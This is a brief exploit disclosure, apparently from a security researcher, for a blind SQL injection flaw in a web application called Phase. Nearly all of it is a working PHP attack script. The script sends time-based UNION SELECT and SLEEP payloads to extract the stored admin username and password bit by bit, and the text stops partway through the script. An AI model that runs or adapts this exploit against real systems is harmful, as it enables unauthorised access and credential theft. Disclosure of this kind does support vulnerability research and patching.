

Type: Blind SQL injection vulnerability

Author: [Xylitol](https://twitter.com/Xylit0l)

```
<?php
	// Start with PHP CLI (php pwn.php)
	set_time_limit(0);

	// Adjust this :)
	define('SLEEP_TIME', '4');
	define('PAGE_TIME',  4);
	define('URL',        'http://localhost/Phase/');

	echo('attacking ' . URL . PHP_EOL);

	get_string('username');
	get_string('password');

	function get_length($field) {
		$length = 1;

		while (!is_true("' UNION SELECT ALL 1,2,3,4,5,6,7 FROM `settings` WHERE `key` = '" . $field . "' AND (NOT (LENGTH(value)=" . $length . ") OR SLEEP(" . SLEEP_TIME . "))-- ")) {
			++$length;
		}

		echo($field . ' length: ' . $length . PHP_EOL);

		return $length;
	}

	function get_string($field) {
		$length = get_length($field);
		$str    = '';

		for ($i = 0; $i < $length; ++$i) {
			$str .= chr(get_char($field, $i));
			echo($field . ' : ' . str_pad($str, $length, '*') . PHP_EOL);
		}

		return $str;
	}

	function get_char($field, $id) {
		$binary = '';

		for ($i = 1; $i < 256; $i *= 2) {
			if ($i == 128)
				$binary = '0' . $binary;
			else
				$binary = (is_true("' UNION SELECT ALL 1,2,3,4,5,6,7 FROM `settings` WHERE `key` = '" . $field . "' AND (NOT (ORD(SUBSTR(`value`," . ($id + 1) . ",1)) & " . $i . ") OR SLEEP(" . SLEEP_TIME . "))-- ") ? '1' : '0') . $binary;

```
